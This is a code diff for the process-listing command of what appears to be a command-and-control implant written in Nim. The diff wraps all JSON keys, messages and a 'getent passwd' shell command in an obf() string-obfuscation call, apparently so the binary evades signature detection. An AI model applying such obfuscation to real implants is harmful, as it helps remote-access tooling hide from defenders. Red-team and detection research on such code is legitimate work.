@@ -1,5 +1,6 @@
 import std/[json, strformat, os, strutils]
 import ../utils/debug
+import ../utils/strenc
 
 type
   ProcessEntry = object
@@ -153,7 +154,7 @@ when not defined(windows):
                   let uid = parts[1]
                   # Try to get username from /etc/passwd
                   try:
-                    let (output, _) = execCmdEx(&"getent passwd {uid}")
+                    let (output, _) = execCmdEx(obf("getent passwd ") & uid)
                     let passwdParts = output.split(':')
                     if passwdParts.len > 0:
                       entry.user = passwdParts[0]
@@ -190,34 +191,34 @@ proc ps*(params: string): JsonNode =
     var processesJson = newJArray()
     for p in processes:
       processesJson.add(%*{
-        "process_id": p.process_id,
-        "architecture": p.architecture,
-        "name": p.name,
-        "user": p.user,
-        "bin_path": p.bin_path,
-        "parent_process_id": p.parent_process_id,
-        "command_line": p.command_line
+        obf("process_id"): p.process_id,
+        obf("architecture"): p.architecture,
+        obf("name"): p.name,
+        obf("user"): p.user,
+        obf("bin_path"): p.bin_path,
+        obf("parent_process_id"): p.parent_process_id,
+        obf("command_line"): p.command_line
       })
     
     # Create the full listing structure
     let listing = %*{
-      "platform": platform,
-      "processes": processesJson
+      obf("platform"): platform,
+      obf("processes"): processesJson
     }
     
     debug &"[DEBUG] Found {processes.len} processes"
     
     return %*{
-      "task_id": "",  # Will be set by agent
-      "status": "success",
-      "completed": true,
-      "user_output": $listing,
-      "processes": processesJson
+      obf("task_id"): "",  # Will be set by agent
+      obf("status"): "success",
+      obf("completed"): true,
+      obf("user_output"): $listing,
+      obf("processes"): processesJson
     }
     
   except Exception as e:
     return %*{
-      "user_output": &"Failed to get process list: {e.msg}",
-      "completed": true,
-      "status": "error"
+      obf("user_output"): obf("Error retrieving process list: ") & e.msg,
+      obf("completed"): true,
+      obf("status"): "error"
     }
